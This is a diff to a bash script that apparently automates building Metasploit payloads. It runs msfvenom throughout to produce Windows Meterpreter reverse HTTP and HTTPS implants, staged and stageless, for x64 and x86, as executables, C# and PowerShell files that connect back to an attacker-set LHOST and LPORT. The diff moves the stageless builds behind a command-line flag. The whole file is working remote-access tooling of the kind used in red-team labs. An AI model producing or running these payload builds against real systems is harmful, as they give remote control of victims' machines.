@@ -75,51 +75,55 @@ msfvenom -p windows/meterpreter/reverse_http LHOST=$LHOST LPORT=$LPORT EXITFUNC=
 chmod +x ./staged_met32_http.exe
 chmod +x ./staged_met32_http.ps1
 
+echo "Done generating staged payloads!"
 
 
+if [ "$1" == "-stageless" ]; then
+    # STAGELESS
+    # Stageless x64 HTTPS
+    echo "Stageless mode detected! Building stageless payloads"
+    cd ./stageless/x64/https
+
+    msfvenom -p windows/x64/meterpreter_reverse_https LHOST=$LHOST LPORT=$LPORT -f exe -o ./stageless_met64_https.exe
+    msfvenom -p windows/x64/meterpreter_reverse_https LHOST=$LHOST LPORT=$LPORT -f csharp -o ./stageless_met64_https.cs
+    msfvenom -p windows/x64/meterpreter_reverse_https LHOST=$LHOST LPORT=$LPORT EXITFUNC=thread -f ps1 -o ./stageless_met64_https.ps1
+
+    chmod +x ./stageless_met64_https.exe
+    chmod +x ./stageless_met64_https.ps1
+
+    # stageless x64 HTTP
+    cd ../../../
+    cd ./stageless/x64/http
+
+    msfvenom -p windows/x64/meterpreter_reverse_http LHOST=$LHOST LPORT=$LPORT -f exe -o ./stageless_met64_http.exe
+    msfvenom -p windows/x64/meterpreter_reverse_http LHOST=$LHOST LPORT=$LPORT -f csharp -o ./stageless_met64_http.cs
+    msfvenom -p windows/x64/meterpreter_reverse_http LHOST=$LHOST LPORT=$LPORT EXITFUNC=thread -f ps1 -o ./stageless_met64_http.ps1
+
+    chmod +x ./stageless_met64_http.exe
+    chmod +x ./stageless_met64_http.ps1
+
+    # stageless x86 https
+    cd ../../../
+    cd ./stageless/x86/https
+
+    msfvenom -p windows/meterpreter_reverse_https LHOST=$LHOST LPORT=$LPORT -f exe -o ./stageless_met32_https.exe
+    msfvenom -p windows/meterpreter_reverse_https LHOST=$LHOST LPORT=$LPORT -f csharp -o ./stageless_met32_https.cs
+    msfvenom -p windows/meterpreter_reverse_https LHOST=$LHOST LPORT=$LPORT EXITFUNC=thread -f ps1 -o ./stageless_met32_https.ps1
+
+    chmod +x ./stageless_met32_https.exe
+    chmod +x ./stageless_met32_https.ps1
 
 
-# STAGELESS
-# Stageless x64 HTTPS
-cd ./stageless/x64/https
+    # stageless x86 http
+    cd ../../../
+    cd ./stageless/x86/http
 
-msfvenom -p windows/x64/meterpreter_reverse_https LHOST=$LHOST LPORT=$LPORT -f exe -o ./stageless_met64_https.exe
-msfvenom -p windows/x64/meterpreter_reverse_https LHOST=$LHOST LPORT=$LPORT -f csharp -o ./stageless_met64_https.cs
-msfvenom -p windows/x64/meterpreter_reverse_https LHOST=$LHOST LPORT=$LPORT EXITFUNC=thread -f ps1 -o ./stageless_met64_https.ps1
+    msfvenom -p windows/meterpreter_reverse_http LHOST=$LHOST LPORT=$LPORT -f exe -o ./stageless_met32_http.exe
+    msfvenom -p windows/meterpreter_reverse_http LHOST=$LHOST LPORT=$LPORT -f csharp -o ./stageless_met32_http.cs
+    msfvenom -p windows/meterpreter_reverse_http LHOST=$LHOST LPORT=$LPORT EXITFUNC=thread -f ps1 -o ./stageless_met32_http.ps1
 
-chmod +x ./stageless_met64_https.exe
-chmod +x ./stageless_met64_https.ps1
+    chmod +x ./stageless_met32_http.exe
+    chmod +x ./stageless_met32_http.ps1
+fi
 
-# stageless x64 HTTP
-cd ../../../
-cd ./stageless/x64/http
-
-msfvenom -p windows/x64/meterpreter_reverse_http LHOST=$LHOST LPORT=$LPORT -f exe -o ./stageless_met64_http.exe
-msfvenom -p windows/x64/meterpreter_reverse_http LHOST=$LHOST LPORT=$LPORT -f csharp -o ./stageless_met64_http.cs
-msfvenom -p windows/x64/meterpreter_reverse_http LHOST=$LHOST LPORT=$LPORT EXITFUNC=thread -f ps1 -o ./stageless_met64_http.ps1
-
-chmod +x ./stageless_met64_http.exe
-chmod +x ./stageless_met64_http.ps1
-
-# stageless x86 https
-cd ../../../
-cd ./stageless/x86/https
-
-msfvenom -p windows/meterpreter_reverse_https LHOST=$LHOST LPORT=$LPORT -f exe -o ./stageless_met32_https.exe
-msfvenom -p windows/meterpreter_reverse_https LHOST=$LHOST LPORT=$LPORT -f csharp -o ./stageless_met32_https.cs
-msfvenom -p windows/meterpreter_reverse_https LHOST=$LHOST LPORT=$LPORT EXITFUNC=thread -f ps1 -o ./stageless_met32_https.ps1
-
-chmod +x ./stageless_met32_https.exe
-chmod +x ./stageless_met32_https.ps1
-
-
-# stageless x86 http
-cd ../../../
-cd ./stageless/x86/http
-
-msfvenom -p windows/meterpreter_reverse_http LHOST=$LHOST LPORT=$LPORT -f exe -o ./stageless_met32_http.exe
-msfvenom -p windows/meterpreter_reverse_http LHOST=$LHOST LPORT=$LPORT -f csharp -o ./stageless_met32_http.cs
-msfvenom -p windows/meterpreter_reverse_http LHOST=$LHOST LPORT=$LPORT EXITFUNC=thread -f ps1 -o ./stageless_met32_http.ps1
-
-chmod +x ./stageless_met32_http.exe
-chmod +x ./stageless_met32_http.ps1
+echo "Done generating stageless payloads!"
